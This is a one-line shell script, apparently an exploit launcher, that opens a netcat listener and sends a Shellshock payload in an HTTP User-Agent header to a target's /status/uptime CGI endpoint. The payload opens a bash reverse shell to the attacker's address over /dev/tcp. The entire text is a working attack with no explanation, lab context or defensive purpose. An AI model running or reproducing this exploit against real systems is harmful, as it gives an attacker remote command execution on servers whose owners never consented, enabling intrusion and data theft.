x-terminal-emulator -e nc -lvnp 9001 & (sleep 3 && curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/$2/9001 0>&1'" http://$1/status/uptime)